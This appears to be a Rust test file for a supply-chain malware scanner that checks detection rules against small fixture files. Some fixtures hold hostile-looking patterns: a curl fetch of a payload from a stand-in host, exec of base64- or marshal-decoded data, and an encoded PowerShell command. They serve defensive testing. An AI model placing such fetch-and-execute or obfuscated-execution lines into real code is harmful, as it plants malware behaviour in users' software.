use std::{collections::HashSet, fs};

use super::super::*;
use crate::rules::default_rules as built_in_rules;

mod javascript;
mod python;

#[test]
fn scanner_reports_only_high_entropy_string_literals() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("entropy.py"),
        concat!(
            "ordinary = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n",
            "alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'\n",
            "borderline = 'aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqrstuvwxyzABCDEF'\n",
            "alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n",
            "base58_flickr = '123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'\n",
            "opaque = 'nQ8zP4vLm7T2rX9aBcDeFgHiJkNoPqRsTuVwY3Z5mK6sA1bC8dE0fG9hI2jL7pR'\n",
            "url = 'https://example.com/api/v1/items?query=abcdefghijklmnopqrstuvwxyz0123456789'\n",
            "embedded_url = 'callback=https://example.com/api/v1/items?token=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n",
            "regex = r'^(?:[A-Za-z0-9._%+-]+)@(?:[A-Za-z0-9.-]+)\\\\.[A-Za-z]{2,}$'\n",
            "sql = 'SELECT account_id, display_name, email_address FROM users WHERE status = \'active\''\n",
            "format_string = 'User {user_id:08x} requested {resource_name} at {timestamp:%Y-%m-%d}'\n",
            "documentation = 'This documentation sentence describes ordinary usage and should not be treated as opaque.'\n",
        ),
    )
    .unwrap();
    for (file, rule_id) in [
        (
            "entropy.js",
            "chainsec.js.detection.heuristic.high-entropy-string",
        ),
        (
            "entropy.ts",
            "chainsec.ts.detection.heuristic.high-entropy-string",
        ),
    ] {
        fs::write(
            directory.path().join(file),
            "const opaque = `nQ8zP4vLm7T2rX9aBcDeFgHiJkNoPqRsTuVwY3Z5mK6sA1bC8dE0fG9hI2jL7pR`;\n",
        )
        .unwrap();
        let outcome = scan(
            &directory.path().join(file),
            "root",
            &built_in_rules(),
            &EngineLimits::default(),
        )
        .unwrap();
        assert!(
            outcome
                .findings
                .iter()
                .any(|finding| finding.rule_id == rule_id),
            "expected template literal entropy finding for {file}"
        );
    }

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let entropy_findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "chainsec.py.detection.heuristic.high-entropy-string")
        .collect::<Vec<_>>();

    assert_eq!(entropy_findings.len(), 1);
    assert!(
        entropy_findings[0]
            .matched_code
            .contains("nQ8zP4vLm7T2rX9a")
    );
}

#[test]
fn heuristic_rules_detect_dynamic_execution_and_obfuscator_structures() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("payload.js"),
        concat!(
            "globalThis['eval'](payload);\n",
            "setTimeout('runPayload()', 10);\n",
            "const _0x1234 = ['a', 'b', 'c', 'd', 'e'];\n",
            "function accessor(s, Jf, JM) { let jA = 0; return jA++, { ['_$8ADRIL']: s, ['_$ohGP9r']: Jf, ['_$aGuiga']: JM }; }\n",
            "while (cursor < order.length) { switch (order[cursor++]) { case '0': run(); break; case '1': done(); break; } }\n",
        ),
    ).unwrap();
    fs::write(
        directory.path().join("payload.py"),
        concat!(
            "import marshal\n",
            "exec(marshal.loads(blob))\n",
            "import importlib\n",
            "module = importlib.import_module(name)\n",
            "from pyarmor_runtime import __pyarmor__\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let rule_ids = outcome
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect::<HashSet<_>>();
    for rule_id in [
        "chainsec.js.detection.heuristic.string-timer-execution",
        "chainsec.js.detection.javascript-obfuscator",
        "chainsec.js.detection.heuristic.control-flow-flattening",
        "chainsec.py.detection.heuristic.opaque-execution-input",
        "chainsec.py.detection.heuristic.dynamic-module",
        "chainsec.py.detection.heuristic.code-protector-marker",
    ] {
        assert!(rule_ids.contains(rule_id), "missing {rule_id}");
    }
}

#[test]
fn built_in_timer_rule_does_not_flag_callbacks_or_static_imports() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("safe.js"),
        concat!(
            "const callback = () => {};\n",
            "setTimeout(callback, 10);\n",
        ),
    )
    .unwrap();
    fs::write(
        directory.path().join("safe.py"),
        "import json\nvalue = json.loads(data)\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    assert!(!outcome.findings.iter().any(|finding| {
        matches!(
            finding.rule_id.as_str(),
            "chainsec.js.detection.heuristic.string-timer-execution"
                | "chainsec.py.detection.heuristic.dynamic-module"
                | "chainsec.py.detection.heuristic.opaque-execution-input"
        )
    }));
}

#[test]
fn scanner_reports_tree_sitter_guarddog_equivalents() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("payload.py"),
        concat!(
            "import base64\n",
            "import subprocess\n",
            "subprocess.run(['curl', 'https://example.invalid/payload'])\n",
            "exec(base64.b64decode(payload))\n",
        ),
    )
    .unwrap();
    fs::write(
        directory.path().join("payload.js"),
        "child_process.exec('powershell -EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let rule_ids = outcome
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect::<HashSet<_>>();

    assert!(rule_ids.contains("chainsec.py.capability.network-connect-via-lolbas"));
    assert!(rule_ids.contains("chainsec.py.detection.guarddog.base64-decoded-execution"));
    assert!(rule_ids.contains("chainsec.js.detection.guarddog.encoded-powershell"));
}
